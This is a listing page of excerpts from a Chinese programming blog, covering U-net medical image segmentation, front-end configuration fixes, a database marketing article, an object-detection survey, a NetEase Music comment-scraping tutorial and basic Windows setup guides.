		<h2 class="list__title post__title">
			<a href="/posts/b662ef880f539d8d30a3fc25266b828e/" rel="bookmark">
			基于U-net的肝脏肿瘤分割实战（Pytorch实现）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		这是我去年本科毕业设计的一部分，去年使用tensorflow去实现的，这几天就随手用Pytorch做了一下实现。肝脏肿瘤的分割是医学影像分割里面比较重要的一部分，实现从人的CT或MRI影像中将肝脏区域肿瘤给分割出来，对临床治疗还是有一定的实际意义。在这里网络还是使用最简单的U-net网络，U-net作为医学影像分割中的最经典的方法，其Encoder和Decoder的结构以及对称式的设计对后面的很多网络都有很大的影响。
网络结构 跳跃连接部分就是讲encoder的特征图和decoder的特征图在通道纬度上做拼接。
数据集介绍 因为医学影像的特殊性，大多数人的数据集都不会公开，这里介绍一个公开数据集：3D-IRCADB，里面包含有20个病人的CT影像序列，每个病人包含大概几百张吧，记不清楚了，文件是以DICOM格式存储的，mask也是用的DICOM格式存储。我不是很习惯，所以我先将图像都处理成了png格式。长这样：
image：
label：
转换的过程会用到一个第三方库，不详细介绍，会重新写一篇博客。
整个训练过程以及网络结构跟我的前两片博客完全一致，就是dataloader修改了一下，这里不详细介绍了，完整的代码可以访问我的Github找到，用了两千张图像训练了80个epoch得到的结果从肉眼上看起来很不错。
Dataset.py # !/usr/bin/python3 # -*- coding:utf-8 -*- # Author:WeiFeng Liu # @Time: 2021/12/9 下午1:28 """ 使用的是视网膜血管分割的数据集，训练集就二十张图像 """ import torch import cv2 import os import glob from torch.utils.data import Dataset import random class _3Dircadb_Dataset(Dataset): def __init__(self,data_path): self.data_path = data_path self.image_path = glob.glob(os.path.join(data_path,'image/*.png')) self.label_path = glob.glob(os.path.join(data_path,'label/*.png')) def augment(self,image,mode): """ :param image: :param mode: 1 :水平翻转 0 : 垂直翻转 -1 水平+垂直翻转 :return: """ file = cv2.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b662ef880f539d8d30a3fc25266b828e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/69d99023eca525f5067d30feec1cb343/" rel="bookmark">
			SDK安全引擎接入说明
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Android接入说明 权限要求 要求应用app必须具有以下权限
&lt;uses-permission android:name="android.permission.INTERNET" /&gt; &lt;uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" /&gt; &lt;uses-permission android:name="com.google.android.providers.gsf.permission.READ_GSERVICES" /&gt; API接口描述 package com.netshield; public class Netshield { /** * 启动服务 * @param context Application Context * @return 0-成功 -1-失败 */ public static int Start(Context context); /** * 获取客户端IP * @return 客户端IP */ public static String GetClientIP(); } 接入说明 代码接入 AndroidManifest.xml appliction节点中添加以下代码
&lt;provider android:authorities="com.netshield.NetshieldContentProvider" android:exported="false" android:name="com.netshield.NetshieldContentProvider"/&gt; 例如：
&lt;application ...&gt; ... &lt;provider android:authorities="com.netshield.NetshieldContentProvider" android:exported="false" android:name="com.netshield.NetshieldContentProvider"/&gt; &lt;/application&gt; 原生项目 Eclipse
将 AAR 文件后缀名改为 ZIP 并解压，解压的目录需要和项目在同一盘符下。比如项目在F盘，则解压的sdk也应在 F盘。 2、在解压得到的目录里创建一个 libs 文件夹 3、删除 R.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/69d99023eca525f5067d30feec1cb343/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c21fbf90ab2a568ff4f6b66318957f54/" rel="bookmark">
			antd-mobile 多层modal弹框导致mask层显示异常
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		最近用antd-mobile2.30，因为需求需要输入大量信息，因此用到了多层弹窗，然后发现在安卓中多层弹窗正常，但是在ios弹窗中的Modal.alert弹框的mask层无法正常显示
因此看了下它的css属性发现，wrap层存在z-index, translateZ两个属性在两个系统中渲染顺序的问题
.am-modal-wrp { z-index: 999; transform: translateZ(0.2667rem); } z-index在安卓中等级较高，而translateZ在ios中等级较高，这就造成了在遮罩层无法在ios中正常显示，因为wrap存在translateZ，所以始终在mask层上方，因此我们取消translateZ的更高，手动把它设置为0
.am-modal-wrp { transform: translateZ(0); } 这样就可以解决了，新版本就没有这个担忧了，新版本没有用到这个属性
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9213b11b01ca45ccbfe76a265447abde/" rel="bookmark">
			终极解决TS 或者 Vetur 报错，Cannot find module ‘@/xx/xxx‘，找不到*.vue 等编译问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		报错详情：类似于
// 编译器报错： Cannot find module '@/xx/xxx' or its corresponding type declarations.Vetur(2307) // 编译器报错： 找不到模块“XXX.vue”或其相应的类型声明。ts(2307) // 或者 控制台报错 this.$router 等 解决方案配置：
// tsconfig.json { "compilerOptions": { "target": "esnext", "module": "esnext", "strict": true, // js/ts 混用时设为false "jsx": "preserve", "importHelpers": true, "moduleResolution": "node", "experimentalDecorators": true, "esModuleInterop": true, "allowSyntheticDefaultImports": true, "sourceMap": true, "noImplicitThis": true, // js/ts 混用时设为false "baseUrl": ".", "types": ["webpack-env"], "paths": { "@/*": ["src/*"] }, "lib": ["esnext", "dom", "dom.iterable", "scripthost"] }, "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9213b11b01ca45ccbfe76a265447abde/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/27e342495b260ae62bd0138f15034431/" rel="bookmark">
			TIT 计算机图形学实验报告
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		关于计算机图形学有以下实验
实验1 十二面体
实验2 黑白颜色填充双三次bezier曲面片
实验3 RGB立方体重心填充算法
实验4 立方体的背面剔除
实验5 制作立方体光照纹理模型
实验6 基于OBJ文件建模
内容有点多，来不及整理，可以留下邮箱，我发给你们。无偿
但是关于讲解就没有了，期末了，来不及讲，只发源码和实验报告
操作系统和数据库还和原来一样，会一直更新
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c32db8b1aba4762195e3847ccd69985f/" rel="bookmark">
			总结14（12.6-12.12）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本周主要是复习考试
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/33a4e2eaa88bf0467d5e446083d36945/" rel="bookmark">
			总结13（11.29-12.5）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本周复习泛函和非线性数值考试。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d062e475479491f457f128a0e3bba681/" rel="bookmark">
			信创时代，要进入工业物联网，第一只脚应该如何迈？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在进军物联网时代的征途中，一个巨大的问题横亘在所有解决方案面前：数据量正在井喷式的增长。万物互联与互联网时代最直观的区别之一，就是数据的产生和处理量级上有了本质的飞跃。
如一台智能化新能源汽车，每秒钟产生的数据量可达到1GB，一台波音787每秒钟产生的数据量高达5GB；在国家“信创”大背景下，更多国产智能设备注入各个领域，其产生的数据规模相当可观。
如若不能妥善地存储和处理这些数据，“万物互联”也只能是一句空谈。数据库自然是存储海量数据进行加工使用的最终壁垒。时下，针对数据库的革新与颠覆，对构建真正的物联网世界而言即夯实地基，这也是整个信创领域的主旋律。
“半壁江山”关系型数据库，或已不适配当前的时代 关系型 or NoSQL？对于正在加快物联网化进程的企业来说，这是一道火烧眉毛的问题。
在20世纪70年代初，为了减少数据冗余、降低存储费用，关系型数据库应运而生。关系型数据库最大的特征是遵循一定的范式，包括数据类型、数据间关系、ACID规范等。关系型数据库的一个典型特征，不同的关系表之间进行计算后，其结果也依旧是关系型！这些特性让关系型数据库对数据的标准化拥有支撑。关系型数据库从诞生之初到现在，走过了50年的风雨，衍生出Oracle、MySQL、Db2、SQL Server等一系列庞大的家族谱系。目前，市面上占据绝大多数份额的数据库，都还是关系型数据库。
关系型数据库在数据标准化上有相当好的支持。随着信息技术的发展，进入21世纪后，关系型数据库显示出那么一丝的力不从心，其不足也慢慢凸显。关系型数据库往往通过“强一致性”来避免数据库应用中出现的写入冲突和读取冲突，如限制多端读写。当然，这也严重影响了数据的读写和存储效率。进入21世纪，数据量的爆发式增长，以及数据类型的多样化，对于仅支持垂直扩展（即只在硬件方面加强）的关系型数据库，是一份来自时代的严峻挑战。
在布局物联网的进程中，不少企业已经开始拥抱NoSQL类型数据库。
对数据读写性能的强需求，使NoSQL类型的数据库在进入21世纪后，逐渐成为科技行业的新宠。NoSQL即Not Only SQL，泛指不使用关系模型、分布式的数据库，由于其不要求“强一致性”，仅需保证数据的“最终一致性”，可以轻松实现大量数据的存储和读取。同时，NoSQL类型的数据库通过分库分表的方式，可实现水平扩展，而非像关系型数据库仅支持垂直扩展，更适应多业务应用场景。
读写效率的提高，以及多场景的应用，让NoSQL类型的数据库看起来更像是为物联网时代量身定制的“利器”。
综合看来，关系型数据库和NoSQL类型数据库，在标准化和效率+扩展性方面各擅胜场。
物联网时代智能硬件的爆发式增长改变了一切，网络开始呈现出巨量数据、多种类数据的特征，这些都对数据的存储和读写能力提出远超当下水平的需求。对数据量、效率、扩展性等的多重高要求，甚至催生了“云计算”的优化算法“边缘计算”，即数据不全部上云，而是分布处理、仅将结果汇总。
这也折射出一个现象：当下互联网承载的数据量增速远远超出了网络的升级速度，将数据进行分布式存储与处理，减小信道拥堵和信息传递延时，是产业智能化的一种“因地制宜”。边缘计算是应对海量数据的一剂良药，然而边缘计算对数据的读写性有着更高的要求。
信息技术的飞速发展，让时代的天平慢慢倒向NoSQL类型的数据库，因为它实在太适合工业物联网这种海量数据的应用场景了。
“信创”大潮的掀起了硬件更新的革命；智能化设备蜂拥进入网络，让工业生产朝着低人工成本、智能化的方向迈进了一大步；边缘计算中数据分布式存储、运算的刚需，也让关系型数据库支持乏力的通病集中暴露。
所有工业生产领域，欲求实现真正意义上的互联网，就必须对当前占据主流份额的关系型数据库发起一场革命。
Big River超融合数据库：为工业物联网量身定制 无论在何种领域的工业生产中，设备巡检、监控的智能化，是自动化生产最迫切、最重要的一环。
生产过程异常不仅影响良品率，严重的甚至会损坏生产线，酿成巨大经济损失、重大安全事故。如何通过监控的构建完成一体化监管，也是构建工业物联网的核心问题。在工业生产中，对数据监控的稳定运行要求更高、容错率更低；不同设备产生的监控数据类型往往各异，在传统数据库中造成了读写困难，在“信创”浪潮下各种国产设备涌入工业网络，更加剧了这一现象。
传统关系型数据库在这样的场景下集中暴露的问题，最为凸出的有两个：
首先是效率，“强一致性”的要求导致在高频读写的时候性能出现瓶颈，造成信道堵塞；
其次是生态的横向扩展，仅支持垂直扩展的结构特征对不同开发语言、不同数据类型的应用兼容不友好，严重限制了拓展性。
为工业生产赋能，美信科技打造了针对工业物联网场景的杀手锏——Big River超融合数据库。
Big River数据库是一种基于key-value的高性能、分布式、易扩展的混合型数据库，其根据海量数据特点弥补了关系型数据库的不足，可较好地兼容多种数据库类型，支持k-v数据库，兼容关系型数据库。其不仅具有NoSQL对海量数据的存储管理、灵活扩展能力，还保持了传统关系型数据库支持事务等特性。
相较于市面上应用于工业场景的数据库，Big river数据库既拥有时序数据库的快速读写、存储优势，又具备相较于关系型数据库更为直观、简洁的特性。针对工业物联网应用场景的特性，Big River数据库在设计上，通过以下几个技术特点来对目前工业物联网的监控进行升级突破：
性能优化：
基于C语言优势，将轮询效率提到毫秒级：Big River数据库采用C语言自主设计研发，针对实时数据特点，被检测设备直接将数据发送到监控主机，并存储在缓存中。业界普遍的监测频率仅能达到分钟级，Big River数据库可以实现毫秒级快速轮询。工业物联网相较于IT领域，往往对轮询频率有更高的要求，这样的高灵敏度有助于设备异常的排查。工业领域能在单位时间产生海量数据，数据库的效率是第一要务。
可分布式集群部署，实现海量数据存储：Big River数据库支持分布式集群部署，其中每个节点拥有一个数据子集。数据查询被分成查询片段发送给自己所在的数据的节点上执行。这些数据库可以通过添加额外的节点来线性扩展。分布式架构+非结构化存储=水平扩张，分布式存储与高并发访问带来性能的飞跃。另外，Big River数据库基于闭树算法也可根据数据的实际长度自动调节数据存储占用的存储空间，减少不必要的存储空间的占用，达到优化数据存储空间的目的。
高频写入操作优化：Big River数据库相较于传统关系型数据库，基于其K-V特性可以更好地展现树形结构数据间的逻辑关系；应用双缓冲机制，实现高频写入优化，使其拥有了时序数据库一样的高频读写、大容量存储的特性。以监控应用为例，监控数据先写入缓存，再定时写入数据库磁盘，大幅减少写入压力。基于64位缓存寻址，足以支撑单台服务器监测上万监测指标，记录行数可达到百亿级以上，访问时间秒级以内。
应用场景应用优化：
支持事务功能：Big River数据库保留了关系型数据库支持事务功能的优势，这是市场上同类型数据库所不具备的。事务功能的核心要求是数据一致性，Big River数据库在数据库操作失败或者系统出现崩溃时，系统能够以事务为边界进行恢复。当有多个用户同时操作数据库时,数据库能够以事务为单位进行并发控制,使多个用户对数据库的操作相互隔离。事务功能使系统能够更方便的进行故障恢复以及并发控制,从而保证数据库状态的一致性。Big River数据库支持事务的特性，保证了其应用于企事业单位中的可靠性。
灵活数据类型：不同于传统关系型数据库，Big River数据库不需要了解键值对中值的数据是什么数据类型，可以是二进制、文本、Json、XML等。非结构化的特性带来了极高的灵活性，保证了在数据库中增删数据的易用性和易操作性。
简化数据模型设计：传统的关系型数据库中，树形结构很难用表与表之间的关系来表示。而Big River数据库的K-V特性可很好的展现树形结构的数据之间的逻辑关系，可以很好的达到所见即所得的效果。
轻量级敏捷开发：Big River数据库体量小，对环境的依赖程度小，部署灵活，易于维护，且数据易备份、易转移。具有专用管理工具，通过所见即所得带来开发的敏捷，开发运维成本降低。
Big River数据库根据工业物联网的特点，针对高频读写和数据存储进行优化，更适用于大数据量、高并发的数据存储与处理工作；分布式部署的特性更是可以完美支持企业构建边缘计算体系。时下，工业领域动辄几千台设备在工业生产中只是常态。传统监控系统多应用关系型数据库，单点在监测几千台设备的情况下就会出现性能下降，而应用了Big River的监控易单台服务器可以轻松监控上万个监测点，实现秒级轮询的同时长时间保持稳定运行。
根据使用的侧重点不同，Big River数据库可为采集监控类应用（大数据量）、数据网关（高并发数据读写）、分布式检测（分布式部署）等应用场景赋能。
Big River数据库如何汇入信创时代大川 物联网时代的到来，对大数据的存储性和读写性要求达到了空前的高度；“信创”带来的国产替代热潮，也同时扩大了智能硬件进入的窗口。
这一切，都在倒逼数据库市场成长。根据艾瑞咨询发布的《中国数据库行业研究报告（2021）》，2020年中国数据库市场总规模达247.1亿元，同比增长16.2%；政策对国产数据库的扶植也达到空前规模，这使得国外数据库厂商的份额下降至52.4%。
由于数据库建设和企业基础设施的滞后性，目前关系型数据库占到市场份额的90%以上，寻求高性能的NoSQL类型的国产数据库替代仍然有很大空间，类似于Big River这样同时具备高频读写、海量存储、分布式部署等NoSQL特征和关系型数据库的事务管理特性的混合型NewSQL类型数据库，毫无意外地将会是新基建以及信创环境下国产替代的重要抓手。
目前，Big River数据库已经广泛应用于政府 、军工 、医疗 、能源 、金融 、园区 、交通 等领域。相关领域共同面临以下矛盾：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d062e475479491f457f128a0e3bba681/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1ab63a349195c5a099e51fda941aa2a9/" rel="bookmark">
			Pytorch实现U-net视网膜血管分割
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		网络结构 U-net是MICCAI2015的专门针对医学影像分割设计的网络结构，直到今天还是很好用，效果任然很好。网络的左半部分是Encode
部分，此部分将输入图像逐步下采样得到高层的语义信息。右半部分是Decoder部分，将Encode提取的语义特征逐步恢复为原始图像的尺寸，中间是跳跃连接，将下采样过程中提取到的不同level的特征加入到Decoder中，得到更好的分割结果。
完整训练代码和数据可以去我的github上面下载：https://github.com/SPECTRELWF/Semantic-Segmentation
个人主页：liuweifeng.top:8090
数据集介绍 数据集是来自网上的视网膜血管分割数据集，训练集只有二十张图像，少得可怜。测试集也是二十张图像。原始数据集中image和label使用.tif和.gif格式存储的，需要先进行一下预处理，将数据组织成想要的样子，再来进行训练。
train # !/usr/bin/python3 # -*- coding:utf-8 -*- # Author:WeiFeng Liu # @Time: 2021/12/9 下午1:54 from unet_model.unet import UNET from dataset import SWXG_Dataset import torch.optim as optim import torch.nn as nn import torch def train_net(net,device,data_path,epochs=40,batch_size=1,lr=1e-5): isbi_dataset = SWXG_Dataset(data_path) train_loader = torch.utils.data.DataLoader(isbi_dataset, batch_size, shuffle = True) #使用RMSprop优化 optimizer = optim.RMSprop(net.parameters(),lr,weight_decay=1e-8,momentum=0.9) criterion = nn.BCEWithLogitsLoss() best_loss = float("inf") for epoch in range(epochs): net.train() for images, labels in train_loader: optimizer.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1ab63a349195c5a099e51fda941aa2a9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f157fa172240c38adbcddc2c85b848ca/" rel="bookmark">
			综述：解决目标检测中的样本不均衡问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		点击上方“小白学视觉”，选择加"星标"或“置顶”
重磅干货，第一时间送达 作者丨SFXiang
来源丨AI算法修炼营
编辑丨极市平台
极市导读
本文对目标检测中的样本不均衡问题类别进行了详细叙述，介绍了包括OHEM、S-OHEM、Focal loss、GHM等在内的几种主要方法，并梳理了它们的思路和优缺点。
前面的话
当前主流的物体检测算法，如Faster RCNN和SSD等，都是将目标检测当做分类问题来考虑，即先使用先验框或者RPN等生成感兴趣的区域，再对该区域进行分类与回归位置。这种基于分类思想的目标检测算法存在样本不平衡的问题，因而会降低模型的训练效率与检测精度。‍‍‍‍‍‍‍‍‍‍
‍‍‍‍‍‍‍‍‍‍
本文主要介绍如何解决样本不均衡问题。
解决样本不均衡问题
当前基于深度学习的目标检测主要包括：基于two-stage的目标检测和基于one-stage的目标检测。two-stage的目标检测框架一般检测精度相对较高，但检测速度慢；而one-stage的目标检测速度相对较快，但是检测精度相对较低。one-stage的精度不如two-stage的精度，一个主要的原因是训练过程中样本极度不均衡造成的。
定义
样本不均衡问题：指在训练的时候各个类别的样本数量不均衡，由于检测算法各不相同，以及数据集之间的差异，可能会存在正负样本、难易样本、类别间样本这3种不均衡问题。一般在目标检测任务框架中，保持正负样本的比例为1:3（经验值）。
样本不平衡实际上是一种非常常见的现象。比如：在欺诈交易检测，欺诈交易的订单应该是占总交易数量极少部分；工厂中产品质量检测问题，合格产品的数量应该是远大于不合格产品的；信用卡的征信问题中往往就是正样本居多。
目标检测任务中，样本包括哪些类别
正样本：标签区域内的图像区域，即目标图像块
负样本：标签区域以外的图像区域，即图像背景区域
易分正样本：容易正确分类的正样本，在实际训练过程中，该类占总体样本的比重非常高，单个样本的损失函数较小，但是累计的损失函数会主导损失函数
易分负样本：容易正确分类的负样本，在实际训练过程中，该类占的比重非常高，单个样本的损失函数较小，但是累计的损失函数会主导损失函数
难分正样本：错分成负样本的正样本，这部分样本在训练过程中单个样本的损失函数较高，但是该类占总体样本的比例较小
难分负样本：错分成正样本的负样本，这部分样本在训练过程中单个样本的损失函数教高，但是该类占总体样本的比例教小
1.正负样本不均衡
以Faster RCNN为例，在RPN部分会生成20000个左右的Anchor，由于一张图中通常有10个左右的物体，导致可能只有100个左右的Anchor会是正样本，正负样本比例约为1∶200，存在严重的不均衡。
对于目标检测算法，主要需要关注的是对应着真实物体的正样本，在训练时会根据其loss来调整网络参数。相比之下，负样本对应着图像的背景，如果有大量的负样本参与训练，则会淹没正样本的损失，从而降低网络收敛的效率与检测精度。
2.难易样本不均衡
难样本指的是分类不太明确的边框，处在前景与背景的过渡区域上，在网络训练中难样本损失会较大，也是我们希望模型去学习优化的样本，利用这部分训练可以提升检测的准确率。
然而，大量的样本并非处在前景与背景的过渡区，而是与真实物体没有重叠区域的负样本，或者与真实物体重叠程度很高的正样本，这部分被称为简单样本，单个损失会较小，对参数收敛的作用有限。
虽然简单样本单个损失小，但由于数量众多，因此如果全都计算损失的话，其损失也会比难样本大很多，这种难易样本的不均衡也会影响模型的收敛与精度。
值得注意的是，由于负样本中大量的是简单样本，导致难易样本与正负样本这两个不均衡问题有一定的重叠，解决方法往往能同时对这两个问题起作用。
3.类别间样本不均衡
在有些目标检测的数据集中，还会存在类别间的不均衡问题。举个例子，数据集中有100万个车辆、1000个行人的实例标签，样本比例为1000∶1，属于典型的类别不均衡。
这种情况下，如果不做任何处理，使用该数据集进行训练，由于行人这一类别可参考标签太少，会使得模型主要关注车这一类别的检测，网络中的参数主要根据车辆的损失进行优化，导致行人的检测精度大大下降。
目前，解决样本不均衡问题的一些思路：
机器学习中，解决样本不均衡问题主要有2种思路：数据角度和算法角度。从数据角度出发，有扩大数据集、数据类别均衡采样等方法。在算法层面，目标检测方法使用的方法主要有：
Faster RCNN、SSD等算法在正负样本的筛选时，根据样本与真实物体的IoU大小，设置了3∶1的正负样本比例，这一点缓解了正负样本的不均衡，同时也对难易样本不均衡起到了作用。
Faster RCNN在RPN模块中，通过前景得分排序筛选出了2000个左右的候选框，这也会将大量的负样本与简单样本过滤掉，缓解了前两个不均衡问题。
权重惩罚：对于难易样本与类别间的不均衡，可以增大难样本与少类别的损失权重，从而增大模型对这些样本的惩罚，缓解不均衡问题。
数据增强：从数据侧入手，可以在当前数据集上使用随机生成和添加扰动的方法，也可以利用网络爬虫数据等增加数据集的丰富性，从而缓解难易样本和类别间样本等不均衡问题，可以参考SSD的数据增强方法。
近年来，不少的研究者针对样本不均衡问题进行了深入研究，比较典型的有OHEM（在线困难样本挖掘）、S-OHEM、Focal Loss、GHM（梯度均衡化）。下面将详细介绍：
1 OHEM：在线难例挖掘
OHEM算法（online hard example miniing，发表于2016年的CVPR）主要是针对训练过程中的困难样本自动选择，其核心思想是根据输入样本的损失进行筛选，筛选出困难样本（即对分类和检测影响较大的样本），然后将筛选得到的这些样本应用在随机梯度下降中训练。
传统的Fast RCNN系列算法在正负样本选择的时候采用当前RoI与真实物体的IoU阈值比较的方法，这样容易忽略一些较为重要的难负样本，并且固定了正、负样本的比例与最大数量，显然不是最优的选择。以此为出发点，OHEM将交替训练与SGD优化方法进行了结合，在每张图片的RoI中选择了较难的样本，实现了在线的难样本挖掘。
OHEM实现在线难样本挖掘的网络如上图所示。图中包含了两个相同的RCNN网络，上半部的a部分是只可读的网络，只进行前向运算；下半部的b网络即可读也可写，需要完成前向计算与反向传播。
在一个batch的训练中，基于Fast RCNN的OHEM算法可以分为以下5步：
（1）按照原始Fast RCNN算法，经过卷积提取网络与RoI Pooling得到了每一张图像的RoI。
（2）上半部的a网络对所有的RoI进行前向计算，得到每一个RoI的损失。
（3）对RoI的损失进行排序，进行一步NMS操作，以去除掉重叠严重的RoI，并在筛选后的RoI中选择出固定数量损失较大的部分，作为难样本。
（4）将筛选出的难样本输入到可读写的b网络中，进行前向计算，得到损失。
（5）利用b网络得到的反向传播更新网络，并将更新后的参数与上半部的a网络同步，完成一次迭代。
当然，为了实现方便，OHEM的简单实现可以是：在原有的Fast-RCNN里的loss layer里面对所有的props计算其loss，根据loss对其进行排序，选出K个hard examples，反向传播时，只对这K个props的梯度/残差回传，而其他的props的梯度/残差设为0。
但是，由于其特殊的损失计算方式，把简单的样本都舍弃了，导致模型无法提升对于简单样本的检测精度，这也是OHEM方法的一个弊端。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f157fa172240c38adbcddc2c85b848ca/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/54533a92562f52426a8a8a4b75740b03/" rel="bookmark">
			【爬虫Practice5】爬取网易云音乐评论
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		这里以爬取网易云某一首歌的评论为例，当然爬取歌词等方法也是一模一样的，只是请求的参数不一样，这里比较难的地方就是解密和加密的过程，需要弄清楚。
评论加载、歌词等都是通过Ajax请求来的，但下面的参数被加密了
import requests import json from fake_useragent import UserAgent from Crypto.Cipher import AES from base64 import b64encode if __name__ == "__main__": url = '"https://music.163.com/weapi/comment/resource/comments/get?csrf_token="' # 1.真实参数 data = { 'rid': "R_SO_4_1294378245", 'threadId': "R_SO_4_1294378245", 'pageNo': "1", 'pageSize': "20", 'cursor': "-1", 'offset': "0", 'orderType': "1", 'csrf_token': "" } # 2.处理加密过程 获取params key e = '010001' f = "00e0b509f6259df8642dbc35662901477df22677ec152b5ff68ace615bb7b725152b3ab17a876aea8a5aa76d2e417629ec4ee341f56135fccf695280104e0312ecbda92557c93870114af6c9d05c4f7f0c3685b7a46bee255932575cce10b424d813cfe4875d3e82047b97ddef52741d546b8e289dc6935b3ece0462db0a22b8e7" g = "0CoJUm6Qyw8W8jud" # 注意i是要查看的 因为params和key的生成都需要i i = "6mGGm0cVaHLsaC79" # 20.生成16倍数的数据长度 def to_16(data): pad = 16 - len(data) % 16 data += chr(pad) * pad return data # 21.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/54533a92562f52426a8a8a4b75740b03/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8d8437c54bacc2427e1f96644b090a76/" rel="bookmark">
			编程实现集合的交、并、差运算(数组）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		//第一个问题：编程实现集合的交、并、差运算
离散数学，课堂加分练习题
#include&lt;iostream&gt; #include&lt;stdio.h&gt; #include&lt;time.h&gt; using namespace std; void grbq(char s[]) { time_t rawtime; struct tm * timeinfo; time (&amp;rawtime); timeinfo = localtime ( &amp;rawtime ); printf("\n%s ",s); printf("%s", asctime (timeinfo) ); } int main() { int a[100],b[100],bing[200],jiao[100],cha1[100],cha2[100],dcha[100],i=0,j=0; int n=0,m=0; cout&lt;&lt;"请输入集合A的数量："; cin&gt;&gt;n; cout&lt;&lt;"请输入集合B的数量："; cin&gt;&gt;m; cout&lt;&lt;"\n请输入集合A的元素："; for(i=0;i&lt;n;i++) { cin&gt;&gt;a[i]; }//输入集合a cout&lt;&lt;"请输入集合B的元素："; for(j=0;j&lt;m;j++) { cin&gt;&gt;b[j]; }//输入集合b //计算集合a和b的交集 int k=0; for(i=0;i&lt;n;i++) { for(j=0;j&lt;m;j++) { if(a[i]==b[j]) jiao[k++]=a[i]; } } cout&lt;&lt;"\n集合A和集合B的交集是：{"; for(i=0;i&lt;k;i++) { cout&lt;&lt;jiao[i]&lt;&lt;' '; } printf("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8d8437c54bacc2427e1f96644b090a76/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2ada6dbb9a5cdb4f949116ae25d2f2e5/" rel="bookmark">
			笔记：目标检测二十年综述Object Detection in 20 Years: A Survey中英对照翻译、重点标注及关键词翻译
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/90763168daa453e60960403b004a3488/" rel="bookmark">
			cmd找不到conda以及通过cmd启用Anaconda中的Python环境（base）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		参考：https://blog.csdn.net/me_mechanical/article/details/111589043
在系统环境中添加Anaconda路径 按下键盘win+R，输入cmd，回车，在cmd中输入conda list，发现结果显示如下：
发现识别不出来命令，经过搜索，找到了这个解决方案，当然只是参考其中一部分，我们的Anaconda已经安装完成了，只是没有添加到系统环境当中，具体添加方式：
首先打开高级系统设置
点击环境变量
依次编辑这两个Path
选择新建，并将Anaconda安装目录下的Scripts路径添加到其中
最后一直点确定就可以了
此时再在cmd中输入conda list，发现结果就有了：
重启下vscode发现在cmd中也可以了
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9743a591e656bdc4e24dffdcf100e780/" rel="bookmark">
			两台电脑通过网线共享文件
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		两台电脑通过网线传输文件 首先用网线将两台电脑连接起来，两台电脑通过网线连接组成简单的“局域网”，通过简单设置即可实现。
1.设置电脑1和电脑2的以太网
（1）找到网络图标
（2）选中该图标右键—&gt;属性，选择“以太网”
（3）选择以太网“属性”
（4）弹出的对话框中选中“TCP/IPv4”，然后点击“属性”
（5）弹出的对话框，对电脑1进行如下设置
（6）对电脑2进行如下设置
电脑设置部分到此结束，接下来进行文件共享。
2.文件共享
（1）首先操作被共享文件所在的电脑1，在电脑1中选中被共享的文件，右键“属性”，选择“共享”
（2）在共享一栏里先打开“共享”，弹出的界面选择将文件共享给“everyone”，需要添加“everyone”，首先选择"\/"图标,然后选择everyone，最后点击添加，如下所示
（3）添加后如下图所示，点击倒三角，将属性改为“读取/写入”，最后选择“共享”
（4）选择“高级共享”，弹出的对话框中勾选“共享此文件夹”，文件夹的名字会在下方显示，其他默认不管，然后“应用”“确定”
被共享文件的电脑1设置完毕。
3.打开电脑2
